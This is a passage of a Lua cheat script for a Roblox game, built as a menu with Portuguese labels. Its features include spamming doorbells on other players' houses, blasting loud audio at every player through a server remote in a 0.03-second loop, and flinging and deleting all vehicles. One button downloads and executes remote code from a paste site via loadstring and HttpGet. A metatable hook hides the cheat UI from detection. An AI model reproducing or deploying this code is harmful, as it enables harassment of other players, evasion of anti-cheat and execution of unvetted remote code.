            getgenv().ChaosHubAutoSpawnDoorbellValue = Value
            spawn(function()
                while getgenv().ChaosHubAutoSpawnDoorbellValue do
                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
                    if House and House:FindFirstChild("HousePickedByPlayer") then
                        local doorbell = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_DoorBell")
                        if doorbell and doorbell:FindFirstChild("TouchBell") then
                            pcall(function()
                                fireclickdetector(doorbell.TouchBell.ClickDetector)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })
end)

-- Toggle para bater na porta
pcall(function()
    Tabcasa:AddToggle({
        Name = "BATER NA PORTA",
        Description = "",
        Default = false,
        Callback = function(Value)
            getgenv().ChaosHubAutoSpawnDoorValue = Value
            spawn(function()
                while getgenv().ChaosHubAutoSpawnDoorValue do
                    local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
                    if House and House:FindFirstChild("HousePickedByPlayer") then
                        local doors = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_HouseDoors")
                        if doors and doors:FindFirstChild("HouseDoorFront") and doors.HouseDoorFront:FindFirstChild("Knock") then
                            pcall(function()
                                fireclickdetector(doors.HouseDoorFront.Knock.TouchBell.ClickDetector)
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    })
end)
pcall(function()
    Tabcasa:AddSection({ Name = "TELEPORTE PARA CASAS" })
end)

-- Lista de casas para teletransporte
local casas = {
    ["Casa 1"] = Vector3.new(260.29, 4.37, 209.32),
    ["Casa 2"] = Vector3.new(234.49, 4.37, 228.00),
    ["Casa 3"] = Vector3.new(262.79, 21.37, 210.84),
    ["Casa 4"] = Vector3.new(229.60, 21.37, 225.40),
    ["Casa 5"] = Vector3.new(173.44, 21.37, 228.11),
    ["Casa 6"] = Vector3.new(-43, 21, -137),
    ["Casa 7"] = Vector3.new(-40, 36, -137),
    ["Casa 11"] = Vector3.new(-21, 40, 436),
    ["Casa 12"] = Vector3.new(155, 37, 433),
    ["Casa 13"] = Vector3.new(255, 35, 431),
    ["Casa 14"] = Vector3.new(254, 38, 394),
    ["Casa 15"] = Vector3.new(148, 39, 387),
    ["Casa 16"] = Vector3.new(-17, 42, 395),
    ["Casa 17"] = Vector3.new(-189, 37, -247),
    ["Casa 18"] = Vector3.new(-354, 37, -244),
    ["Casa 19"] = Vector3.new(-456, 36, -245),
    ["Casa 20"] = Vector3.new(-453, 38, -295),
    ["Casa 21"] = Vector3.new(-356, 38, -294),
    ["Casa 22"] = Vector3.new(-187, 37, -295),
    ["Casa 23"] = Vector3.new(-410, 68, -447),
    ["Casa 24"] = Vector3.new(-348, 69, -496),
    ["Casa 28"] = Vector3.new(-103, 12, 1087),
    ["Casa 29"] = Vector3.new(-730, 6, 808),
    ["Casa 30"] = Vector3.new(-245, 7, 822),
    ["Casa 31"] = Vector3.new(639, 76, -361),
    ["Casa 32"] = Vector3.new(-908, 6, -361),
    ["Casa 33"] = Vector3.new(-111, 70, -417),
    ["Casa 34"] = Vector3.new(230, 38, 569),
    ["Casa 35"] = Vector3.new(-30, 13, 2209)
}

-- Criar lista de nomes de casas ordenada
local casasNomes = {}
for nome, _ in pairs(casas) do
    table.insert(casasNomes, nome)
end

table.sort(casasNomes, function(a, b)
    local numA = tonumber(a:match("%d+")) or 0
    local numB = tonumber(b:match("%d+")) or 0
    return numA < numB
end)

-- Dropdown para teletransporte
pcall(function()
    Tabcasa:AddDropdown({
        Name = "Selecionar Casa",
        Options = casasNomes,
        Callback = function(casaSelecionada)
            local player = game.Players.LocalPlayer
            if player and player.Character then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(casas[casaSelecionada])
            end
        end
    })
end)





local teleportButtons = {
    {"TP BASTIDORES", CFrame.new(192, 4, 272)},
    {"TP CENTRO URBANO", CFrame.new(136, 4, 117)},
    {"TP ÁREA DO CRIME", CFrame.new(-119, -28, 235)},
    {"TP CASA DESERTA", CFrame.new(986, 4, 63)},
    {"TP PORTAL DA AGÊNCIA", CFrame.new(672, 4, -296)},
    {"TP ESCONDERIJO", CFrame.new(505, -75, 143)},
    {"TP ESCOLA", CFrame.new(-312, 4, 211)},
    {"TP CAFÉ BROOK", CFrame.new(161, 8, 52)},
    {"TO PONTO INICIAL", CFrame.new(-26, 4, -23)},
    {"TP ARCO PRINCIPAL", CFrame.new(-589, 141, -59)},
    {"TP HOSPITAL", CFrame.new(-309, 4, 71)},
    {"TP BASE DA AGÊNCIA", CFrame.new(179, 4, -464)},
    {"TP SALA OCULTA DA OFICINA", CFrame.new(0, 4, -495)},
    {"TP SALA SECRETA 2", CFrame.new(-343, 4, -613)},
    {"TP ILHA ISOLADA", CFrame.new(-1925, 23, 127)},
    {"TP PRAÇA DOS HOTÉIS", CFrame.new(182, 4, 150)},
    {"TP ESCALAR MONTANHA 1", CFrame.new(-670, 251, 765)},
    {"TP BANCO PRINCIPAL", CFrame.new(2.28, 4.65, 254.58)},
    {"TP LOJA DE ROUPAS", CFrame.new(-46.15, 4.65, 253.20)},
    {"TP REFÚGIO", CFrame.new(-88.48, 22.05, 262.34)},
    {"TP CLÍNICA DENTÁRIA", CFrame.new(-53.58, 22.15, 265.61)},
    {"TP CAFETERIA", CFrame.new(-97.12, 4.65, 254.99)}
}

for _, btn in ipairs(teleportButtons) do
    Tab:AddButton({
        btn[1],
        function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = btn[2]
        end
    })
end





-- Lista de áudios
local audios = {
    {Name = "Yamete Kudasai", ID = 108494476595033},
    {Name = "Gritinho", ID = 5710016194},
    {Name = "Jumpscare Horroroso", ID = 85435253347146},
    {Name = "Áudio Alto", ID = 6855150757},
    {Name = "Ruído", ID = 120034877160791},
    {Name = "Jumpscare 2", ID = 110637995610528},
    {Name = "Risada Da Bruxa Minecraft", ID = 116214940486087},
    {Name = "The Boiled One", ID = 137177653817621},
    {Name = "Deitei Um Ave Maria Doido", ID = 128669424001766},
    {Name = "Mandrake Detected", ID = 9068077052},
    {Name = "Aaaaaaaaa", ID = 80156405968805},
    {Name = "AAAHHHH", ID = 9084006093},
    {Name = "amongus", ID = 6651571134},
    {Name = "Sus", ID = 6701126635},
    {Name = "Gritao AAAAAAAAA", ID = 5853668794},
    {Name = "UHHHHH COFFCOFF", ID = 7056720271},
    {Name = "SUS", ID = 7153419575},
    {Name = "Sonic.exe", ID = 2496367477},
    {Name = "Tubers93 1", ID = 270145703},
    {Name = "Tubers93 2", ID = 18131809532},
    {Name = "John's Laugh", ID = 130759239},
    {Name = "Nao sei KKKK", ID = 6549021381},
    {Name = "Grito", ID = 80156405968805},
    {Name = "audio estranho", ID = 7705506391},
    {Name = "AAAH", ID = 7772283448},
    {Name = "Gay, gay", ID = 18786647417},
    {Name = "Bat Hit", ID = 7129073354},
    {Name = "Nuclear Siren", ID = 675587093},
    {Name = "Sem ideia de nome KK", ID = 7520729342},
    {Name = "Grito 2", ID = 91412024101709},
    {Name = "Estora tímpano", ID = 268116333},
    {Name = "[ Content Deleted ]", ID = 106835463235574},
    {Name = "Toma Jack", ID = 132603645477541},
    {Name = "Pede ifood pede", ID = 133843750864059},
    {Name = "I Ghost The down", ID = 84663543883498},
    {Name = "Compre OnLine Na shoope", ID = 8747441609},
    {Name = "Uh Que Nojo", ID = 103440368630269},
    {Name = "Sai dai Lava Prato", ID = 101232400175829},
    {Name = "Seloko num compensa", ID = 78442476709262},
    {Name = "(EM BREVE)  FUNK", ID = 124348034550602},
    {Name = "Candyland - Tobu", ID = 118939739460633},
    {Name = "Meme do Dom pollo What the hell", ID = 100656590080703},
    {Name = "não to entendendo nd meme estourado", ID = 7962533987},
}

local selectedAudioID

-- Adicionar uma textbox para inserir o ID do áudio
Tabmusic:AddTextBox({
    Name = "Insira o ID do Áudio ou Musica",
    Description = "Digite o ID do áudio",
    PlaceholderText = "ID do áudio",
    Callback = function(value)
        selectedAudioID = tonumber(value)
    end
})

-- Adicionar uma dropdown para selecionar o áudio
local audioNames = {}
for _, audio in ipairs(audios) do
    table.insert(audioNames, audio.Name)
end

Tabmusic:AddDropdown({
    Name = "SELECIONE ÁUDIO",
    Description = "Escolha um áudio da lista",
    Options = audioNames,
    Default = audioNames[1],
    Flag = "selected_audio",
    Callback = function(value)
        for _, audio in ipairs(audios) do
            if audio.Name == value then
                selectedAudioID = audio.ID
                break
            end
        end
    end
})

-- Controle do loop
local audioLoop = false

-- Nova seção para loop de áudio
Tabmusic:AddSection({"LOOP DE AUDIO"})

-- Função para tocar o áudio repetidamente
local function playLoopedAudio()
    while audioLoop do
        if selectedAudioID then
            local args = {
                [1] = game:GetService("Workspace"),
                [2] = selectedAudioID,
                [3] = 1,
            }
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))

            -- Criar e tocar o áudio
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://" .. selectedAudioID
            sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
            sound:Play()
        else
            warn("Nenhum áudio selecionado!")
        end

        task.wait(0.5) -- Pequeno delay para evitar sobrecarga
    end
end

-- Toggle para loop de áudio
Tabmusic:AddToggle({
    Name = "REPETIR  ÁUDIO",
    Default = false,
    Flag = "audio_loop",
    Callback = function(value)
        audioLoop = value
        if audioLoop then
            task.spawn(playLoopedAudio) -- Inicia o loop em uma nova thread
        end
    end
})



-- Função para tocar o áudio normal
local function playAudio()
    if selectedAudioID then
        local args = {
            [1] = game:GetService("Workspace"),
            [2] = selectedAudioID,
            [3] = 1,
        }
        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))

        -- Criar e tocar o áudio
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. selectedAudioID
        sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
        sound:Play()
    else
        warn("Nenhum áudio selecionado!")
    end
end


-- Botão para tocar o áudio
Tabmusic:AddButton({"TOCA ÁUDIO", function()
    playAudio()
end})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local audioID = 6314880174 -- ID fixo do áudio

local function Audio_All_ClientSide(ID)
    local function CheckFolderAudioAll()
        local FolderAudio = workspace:FindFirstChild("Audio all client")
        if not FolderAudio then
            FolderAudio = Instance.new("Folder")
            FolderAudio.Name = "Audio all client"
            FolderAudio.Parent = workspace
        end
        return FolderAudio
    end

    local function CreateSound(ID)
        if type(ID) ~= "number" then
            print("Insira um número válido!")
            return nil
        end

        local Folder_Audio = CheckFolderAudioAll()
        if Folder_Audio then
            local Sound = Instance.new("Sound")
            Sound.SoundId = "rbxassetid://" .. ID
            Sound.Volume = 1
            Sound.Looped = false
            Sound.Parent = Folder_Audio
            Sound:Play()
            task.wait(1) -- Tempo de espera antes de remover o som
            Sound:Destroy()
        end
    end

    CreateSound(ID)
end

local function Audio_All_ServerSide(ID)
    if type(ID) ~= "number" then
        print("Insira um número válido!")
        return nil
    end

    local GunSoundEvent = ReplicatedStorage:FindFirstChild("1Gu1nSound1s", true)
    if GunSoundEvent then
        GunSoundEvent:FireServer(workspace, ID, 1)
    end
end

-- Toggle para "Estorar ouvido de geral"
Tabmusic:AddToggle({
    Name = " ÁUDIO ESTOURADO EM TODOS",
    Description = "Toca áudio repetidamente para todos",
    Default = false,
    Flag = "audio_spam",
    Callback = function(value)
        getgenv().Audio_All_loop_fast = value

        while getgenv().Audio_All_loop_fast do
            Audio_All_ServerSide(audioID)
            task.spawn(function()
                Audio_All_ClientSide(audioID)
            end)
            task.wait(0.03) -- Delay extremamente rápido (0.03 segundos)
        end
    end
})



CarTab:AddButton({
    Name = "FLY CAR",
    Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/RtliHFjP/raw"))()
    end
})

CarTab:AddToggle({
    Name = "AUTO REMOVER VEÍCULO",
    Description = "REMOVE TODOS VEÍCULO",
    Callback = function(state)
        if state then
            -- Loop principal para remover veículos
            spawn(function()
                while getgenv().AutoRemoveVehicles do
                    pcall(function()
                        -- Percorre todos os veículos no jogo
                        for _, vehicle in pairs(game:GetService("Workspace").Vehicles:GetChildren()) do
                            if vehicle:IsA("Model") and vehicle:FindFirstChild("Humanoid") == nil then
                                -- Remove o veículo
                                vehicle:Destroy()
                            end
                        end
                        
                        -- Remove também veículos no chão
                        for _, obj in pairs(game:GetService("Workspace").Parts:GetChildren()) do
                            if obj:IsA("Part") and obj.Name:lower():find("vehicle") or obj.Name:lower():find("car") then
                                obj:Destroy()
                            end
                        end
                    end)
                    wait(0.5) -- Delay para não sobrecarregar
                end
            end)
            
            -- Conexão para novos veículos que spawnarem
            local vehicleAddedConnection
            vehicleAddedConnection = game:GetService("Workspace").ChildAdded:Connect(function(child)
                if getgenv().AutoRemoveVehicles then
                    task.wait(0.1)
                    pcall(function()
                        if child:IsA("Model") and child:FindFirstChild("Humanoid") == nil then
                            child:Destroy()
                        elseif child:IsA("Part") and (child.Name:lower():find("vehicle") or child.Name:lower():find("car")) then
                            child:Destroy()
                        end
                    end)
                else
                    vehicleAddedConnection:Disconnect()
                end
            end)
            
            -- Variável global para controle
            getgenv().AutoRemoveVehicles = true
            
        else
            -- Desativa a remoção
            getgenv().AutoRemoveVehicles = false
        end
    end,
})

CarTab:AddButton({
    Name = "REMOVE TODOS CARROS",
    Callback = function()
        local ofnawufn = false

if ofnawufn == true then
    return
end
ofnawufn = true

local cawwfer = "MilitaryBoatFree" -- Alterado para MilitaryBoatFree
local oldcfffff = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1754, -2, 58) -- Coordenadas atualizadas
wait(0.3)

local args = {
    [1] = "PickingBoat", -- Alterado para PickingBoat
    [2] = cawwfer
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
wait(1)

local wrinfjn
for _, errb in pairs(game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"]:GetDescendants()) do
    if errb:IsA("VehicleSeat") then
        wrinfjn = errb
    end
end

repeat
    if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then return end
    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
        if not game.Players.LocalPlayer.Character.Humanoid.SeatPart == wrinfjn then
            game.Players.LocalPlayer.Character.Humanoid.Sit = false
        end
    end
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame + Vector3.new(0,1,0)
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame + Vector3.new(0,-1,0)
    task.wait()
until game.Players.LocalPlayer.Character.Humanoid.SeatPart == wrinfjn

for _, wifn in pairs(game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"]:GetDescendants()) do
    if wifn.Name == "PhysicalWheel" then
        wifn:Destroy()
    end
end

local FLINGED = Instance.new("BodyThrust", game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass) 
FLINGED.Force = Vector3.new(50000, 0, 50000) 
FLINGED.Name = "SUNTERIUM HUB FLING"
FLINGED.Location = game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.Position

for _, wvwvwasc in pairs(game.workspace.Vehicles:GetChildren()) do
    for _, ascegr in pairs(wvwvwasc:GetDescendants()) do
        if ascegr.Name == "VehicleSeat" then
            local targetcar = ascegr
            local tet = Instance.new("BodyVelocity", game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass)
            tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
            tet.P = 1250
            tet.Velocity = Vector3.new(0,0,0)
            tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
            for m=1,25 do
                local pos = {x=0, y=0, z=0}
                pos.x = targetcar.Position.X
                pos.y = targetcar.Position.Y
                pos.z = targetcar.Position.Z
                pos.x = pos.x + targetcar.Velocity.X / 2
                pos.y = pos.y + targetcar.Velocity.Y / 2
                pos.z = pos.z + targetcar.Velocity.Z / 2
                if pos.y <= -200 then
                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(0,1000,0)
                else
                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
                    task.wait()
                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) + Vector3.new(0,-2,0)
                    task.wait()
                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(0,0,2)
                    task.wait()
                    game.workspace.Vehicles[
game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(2,0,0)
                    task.wait()
                end
                task.wait()
            end
        end
    end
end

task.wait()
local args = {
    [1] = "DeleteAllVehicles"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
game.Players.LocalPlayer.Character.Humanoid.Sit = false
wait()
local tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart)
tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
tet.P = 1250
tet.Velocity = Vector3.new(0,0,0)
tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
wait(0.1)
for m=1,2 do 
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcfffff
end
wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcfffff
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"):Destroy()
wait(0.2)
ofnawufn = false
    end
})


CarTab:AddToggle({
    Name = "CARRO RGB",
    Default = false,
    Callback = function(Value)
        isColorChanging = Value

        if isColorChanging then
            colorChangeCoroutine = coroutine.create(function()
                while isColorChanging do
                    for _, color in ipairs(colors) do
                        if not isColorChanging then return end
                        local args = {
                            [1] = "PickingCarColor",
                            [2] = color
                        }
                        remoteEvent:FireServer(unpack(args))
                        wait(1)
                    end
                end
            end)
            coroutine.resume(colorChangeCoroutine)
        end
    end
})

-- Cores RGB
local colors = {
    Color3.new(1, 0, 0),     -- Vermelho
    Color3.new(0, 1, 0),     -- Verde
    Color3.new(0, 0, 1),     -- Azul
    Color3.new(1, 1, 0),     -- Amarelo
    Color3.new(1, 0, 1),     -- Magenta
    Color3.new(0, 1, 1),     -- Ciano
    Color3.new(0.5, 0, 0.5), -- Roxo
    Color3.new(1, 0.5, 0)    -- Laranja
}

-- Serviço e RemoteEvent
local replicatedStorage = game:GetService("ReplicatedStorage")
local remoteEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r")





Tabconfg:AddSection({ Name = "CONFIG" })

Tabconfg:AddTextBox({
    Name = "ENTRAR NO SERVIDOR",
    PlaceholderText = "DIGITE O ID DO SERVIDOR",
    Callback = function(serverId)
        if typeof(serverId) == "string" and serverId ~= "" then
            local TeleportService = game:GetService("TeleportService")
            local placeId = game.PlaceId

            TeleportService:TeleportToPlaceInstance(placeId, serverId, game.Players.LocalPlayer)
        else
            warn("ID do servidor inválido.")
        end
    end
})

Tabconfg:AddButton({
    Name = "COPIAR ID DO SERVIDOR",
    Callback = function()
        local serverId = tostring(game.JobId or "")
        if setclipboard then
            setclipboard(serverId)
        end
    end
})

Tabconfg:AddButton({
    Name = "SHIFT LOK",
    Callback = function()
        local shiftlockk = Instance.new("ScreenGui")
local LockButton = Instance.new("ImageButton")
local btnIcon = Instance.new("ImageLabel")
local buttonEffect = Instance.new("UICorner")
local buttonStroke = Instance.new("UIStroke")
local closeButton = Instance.new("TextButton")
local closeEffect = Instance.new("UICorner")
local closeStroke = Instance.new("UIStroke")

function protectUI(sGui)
    local function blankfunction(...)
        return ...
    end
    local cloneref = cloneref or blankfunction
    local function SafeGetService(service)
        return cloneref(game:GetService(service)) or game:GetService(service)
    end
    local cGUI = SafeGetService("CoreGui")
    local rPlr = SafeGetService("Players"):FindFirstChildWhichIsA("Player")
    local cGUIProtect = {}
    local rService = SafeGetService("RunService")
    local lPlr = SafeGetService("Players").LocalPlayer
    local function NAProtection(inst, var)
        if inst then
            if var then
                inst[var] = "\0"
                inst.Archivable = false
            else
                inst.Name = "\0"
                inst.Archivable = false
            end
        end
    end
    if (get_hidden_gui or gethui) then
        local hiddenUI = (get_hidden_gui or gethui)
        NAProtection(sGui)
        sGui.Parent = hiddenUI()
        return sGui
    elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then
        NAProtection(sGui)
        syn.protect_gui(sGui)
        sGui.Parent = cGUI
        return sGui
    elseif cGUI:FindFirstChildWhichIsA("ScreenGui") then
        pcall(function()
            for _, v in pairs(sGui:GetDescendants()) do
                cGUIProtect[v] = rPlr.Name
            end
            sGui.DescendantAdded:Connect(function(v)
                cGUIProtect[v] = rPlr.Name
            end)
            cGUIProtect[sGui] = rPlr.Name
            local meta = getrawmetatable(game)
            local tostr = meta.__tostring
            setreadonly(meta, false)
            meta.__tostring = newcclosure(function(t)
                if cGUIProtect[t] and not checkcaller() then
                    return cGUIProtect[t]
                end
                return tostr(t)
            end)
        end)
        if not rService:IsStudio() then
            local newGui = cGUI:FindFirstChildWhichIsA("ScreenGui")
            newGui.DescendantAdded:Connect(function(v)
                cGUIProtect[v] = rPlr.Name
            end)
            for _, v in pairs(sGui:GetChildren()) do
                v.Parent = newGui
            end
            sGui = newGui
        end
        return sGui
    elseif cGUI then
        NAProtection(sGui)
        sGui.Parent = cGUI
        return sGui
    elseif lPlr and lPlr:FindFirstChild("PlayerGui") then
        NAProtection(sGui)
        sGui.Parent = lPlr:FindFirstChild("PlayerGui")
        return sGui
    else
        return nil
    end
end

shiftlockk.Name = "shiftlockk"
protectUI(shiftlockk)
shiftlockk.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
shiftlockk.ResetOnSpawn = false
shiftlockk.DisplayOrder = 69

LockButton.Name = "LockButton"
LockButton.Parent = shiftlockk
LockButton.AnchorPoint = Vector2.new(0.5, 0.5)
LockButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
LockButton.BackgroundTransparency = 0.3
LockButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
LockButton.BorderSizePixel = 0
LockButton.Position = UDim2.new(0.785148501, 0, 0.865914762, 0)
LockButton.Size = UDim2.new(0, 65, 0, 65)
LockButton.ZIndex = 3
LockButton.Image = ""
LockButton.AutoButtonColor = true

buttonEffect.Parent = LockButton
buttonEffect.CornerRadius = UDim.new(1, 0)

buttonStroke.Parent = LockButton
buttonStroke.Color = Color3.fromRGB(0,255,0)
buttonStroke.Thickness = 2
buttonStroke.Transparency = 0.3

btnIcon.Name = "btnIcon"
btnIcon.Parent = LockButton
btnIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
btnIcon.BackgroundTransparency = 1
btnIcon.Position = UDim2.new(0.15, 0, 0.15, 0)
btnIcon.Size = UDim2.new(0.7, 0, 0.7, 0)
btnIcon.ZIndex = 3
btnIcon.Image = "rbxasset://textures/ui/mouseLock_off.png"
btnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
btnIcon.ScaleType = Enum.ScaleType.Fit

closeButton.Name = "CloseButton"
closeButton.Parent = LockButton
closeButton.AnchorPoint = Vector2.new(1, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.BackgroundTransparency = 0.3
closeButton.BorderColor3 = Color3.fromRGB(27, 42, 53)
closeButton.BorderSizePixel = 0
closeButton.Position = UDim2.new(1, 0, 0, -5)
closeButton.Size = UDim2.new(0, 20, 0, 20)
closeButton.ZIndex = 4
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.SourceSans
closeButton.AutoButtonColor = true

closeEffect.Parent = closeButton
closeEffect.CornerRadius = UDim.new(0.5, 0)

closeStroke.Parent = closeButton
closeStroke.Color = Color3.fromRGB(255, 255, 255)
closeStroke.Thickness = 1
closeStroke.Transparency = 0.3

local tweenService = game:GetService("TweenService")
local hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local defaultProps = {
    BackgroundTransparency = 0.3,
    Size = UDim2.new(0, 65, 0, 65)
}

local hoverProps = {
    BackgroundTransparency = 0.1,
    Size = UDim2.new(0, 70, 0, 70)
}

local clickProps = {
    BackgroundTransparency = 0,
    Size = UDim2.new(0, 60, 0, 60)
}

local defaultTween = tweenService:Create(LockButton, hoverInfo, defaultProps)
local hoverTween = tweenService:Create(LockButton, hoverInfo, hoverProps)
local clickTween = tweenService:Create(LockButton, clickInfo, clickProps)

LockButton.MouseEnter:Connect(function()
    hoverTween:Play()
end)

LockButton.MouseLeave:Connect(function()
    defaultTween:Play()
end)

LockButton.MouseButton1Down:Connect(function()
    clickTween:Play()
end)

LockButton.MouseButton1Up:Connect(function()
    hoverTween:Play()
end)

NAdrag = function(ui, dragui)
    if not dragui then dragui = ui end
    local UserInputService = game:GetService("UserInputService")
    local dragging
    local dragInput
    local dragStart
    local startPos
    local function update(input)
        local delta = input.Position - dragStart
        local newXOffset = startPos.X.Offset + delta.X
        local newYOffset = startPos.Y.Offset + delta.Y
        local screenSize = ui.Parent.AbsoluteSize
        local newXScale = startPos.X.Scale + (newXOffset / screenSize.X)
        local newYScale = startPos.Y.Scale + (newYOffset / screenSize.Y)
        ui.Position = UDim2.new(newXScale, 0, newYScale, 0)
    end
    dragui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = ui.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    dragui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
    ui.Active = true
end

NAdrag(LockButton)

local function YDYMLAX_fake_script()
    local script = Instance.new('LocalScript', LockButton)
    local Input = game:GetService("UserInputService")
    local V = false
    local main = script.Parent
    local buttonStroke = main:FindFirstChildOfClass("UIStroke")
    main.MouseButton1Click:Connect(function()
        V = not V
        if V then
            main.btnIcon.ImageColor3 = Color3.fromRGB(0, 170, 255)
            buttonStroke.Color = Color3.fromRGB(0, 170, 255)
            buttonStroke.Thickness = 3
            spawn(function()
                while V do
                    for i = 0.3, 0.7, 0.1 do
                        if not V then break end
                        buttonStroke.Transparency = i
                        wait(0.1)
                    end
                    for i = 0.7, 0.3, -0.1 do
                        if not V then break end
                        buttonStroke.Transparency = i
                        wait(0.1)
                    end
                end
            end)
            ForceShiftLock()
        else
            main.btnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
            buttonStroke.Color = Color3.fromRGB(0,255,0)
            buttonStroke.Thickness = 2
            buttonStroke.Transparency = 0.3
            EndForceShiftLock()
        end
    end)
    if closeButton then
        closeButton.MouseButton1Click:Connect(function()
            if V then
                EndForceShiftLock()
                V = false
            end
            shiftlockk:Destroy()
        end)
    end
    local g = nil
    local GameSettings = UserSettings():GetService("UserGameSettings")
    local J = nil
    function ForceShiftLock()
        local i, k = pcall(function()
            return GameSettings.RotationType
        end)
        _ = i
        g = k
        J = game:GetService("RunService").RenderStepped:Connect(function()
            pcall(function()
                GameSettings.RotationType = Enum.RotationType.CameraRelative
            end)
        end)
    end
    function EndForceShiftLock()
        if J then
            pcall(function()
                GameSettings.RotationType = g or Enum.RotationType.MovementRelative
            end)
            J:Disconnect()
        end
    end
end
coroutine.wrap(YDYMLAX_fake_script)()
    end,
})

Tabconfg:AddSection({ Name = "CONFIG FPS" })

Tabconfg:AddToggle({
    Name = "GRAFICO LITE SEM SKIN",
    Callback = function(state)
        if state then
            local Lighting = game:GetService("Lighting")
            local Workspace = game:GetService("Workspace")
            local Players = game:GetService("Players")
            
            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
            
            Lighting.GlobalShadows = false
            Lighting.FogEnd = 9e9
            Lighting.Brightness = 1
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            Lighting.Technology = Enum.Technology.Legacy

            -- Remove todos os efeitos de pós-processamento
            for _, v in ipairs(Lighting:GetDescendants()) do
                if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then
                    pcall(function()
                        v.Enabled = false
                        if v:IsA("Sky") then v:Destroy() end
                    end)
                end
            end
            
            -- Função para limpar objetos
            local function limparObjeto(obj)
                if not obj then return end
                
                -- Remove efeitos visuais
                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Explosion") or obj:IsA("Sparkles") then
                    obj:Destroy()
                elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("BillboardGui") then
                    obj:Destroy()
